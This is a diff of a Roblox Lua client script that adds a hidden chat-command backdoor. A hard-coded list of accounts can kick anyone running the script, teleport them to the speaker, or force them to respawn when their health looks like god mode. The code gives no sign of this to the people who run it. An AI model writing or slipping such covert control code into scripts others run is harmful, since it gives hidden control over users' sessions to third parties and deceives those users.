@@ -1,64 +1,50 @@
 local Players = game:GetService("Players")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
 local LocalPlayer = Players.LocalPlayer
 
-local authorizedUsers = {
+local Admins = {
     ["QT_xAraa"] = true,
     ["Shot16kill"] = true,
     ["philippinesBraxy123"] = true,
-	["Brxy_Alt"] = true,
-	["Bowmbaclaat"] = true,
-	["Drenvoryth"] = true
+    ["Brxy_Alt"] = true,
+    ["Bowmbaclaat"] = true,
+    ["Drenvoryth"] = true
 }
 
-local function onChatMessage(player, message)
-    if authorizedUsers[player.Name] then
-        local match = message:lower():match(">/%s*kick%s+([%w_]+)")
-        if match and LocalPlayer.Name:lower():find(match) then
+local function OnChatMessage(player, message)
+    if Admins[player.Name] then
+        local match1 = message:lower():match(">/%s*kick%s+([%w_]+)")
+        if match1 and LocalPlayer.Name:lower():find(match1) then
             LocalPlayer:Kick("Araa and Braxy did not allow you to use this script.")
         end
-    end
-end
 
-local function setupPlayerChat(player)
-    player.Chatted:Connect(function(message)
-        onChatMessage(player, message)
-    end)
-end
+        local match2 = message:lower():match(">/%s*revealusers%s*")
+        if match2 then
+            if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then
+                LocalPlayer.Character.HumanoidRootPart.CFrame = player.Character.HumanoidRootPart.CFrame
+            end
+        end
 
-for _, player in ipairs(Players:GetPlayers()) do
-    setupPlayerChat(player)
-end
-
-Players.PlayerAdded:Connect(setupPlayerChat)
------------------------------------------------
-local Players = game:GetService("Players")
-local LocalPlayer = Players.LocalPlayer
-local authorizedUsers = {
-    ["QT_xAraa"] = true,
-    ["Shot16kill"] = true,
-    ["philippinesBraxy123"] = true,
-	["Brxy_Alt"] = true,
-	["Bowmbaclaat"] = true,
-	["Drenvoryth"] = true
-}
-
-local function onChatMessage(player, message)
-    if authorizedUsers[player.Name] then
-        local match = message:lower():match(">/%s*revealusers%s*")
-        if match then
-            LocalPlayer.Character.HumanoidRootPart.CFrame = player.Character.HumanoidRootPart.CFrame
+        local match3 = message:lower():match(">/%s*removegm%s*")
+        if match3 then
+            if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("Humanoid") then
+                local Humanoid = LocalPlayer.Character.Humanoid
+                if Humanoid.Health >= 1e18 then
+                    ReplicatedStorage:WaitForChild("SpawnCharacterEvent"):FireServer("MainSpawn")
+                end
+            end
         end
     end
 end
 
-local function setupPlayerChat(player)
+local function SetupPlayerChat(player)
     player.Chatted:Connect(function(message)
-        onChatMessage(player, message)
+        OnChatMessage(player, message)
     end)
 end
 
 for _, player in ipairs(Players:GetPlayers()) do
-    setupPlayerChat(player)
+    SetupPlayerChat(player)
 end
 
-Players.PlayerAdded:Connect(setupPlayerChat)
+Players.PlayerAdded:Connect(SetupPlayerChat)
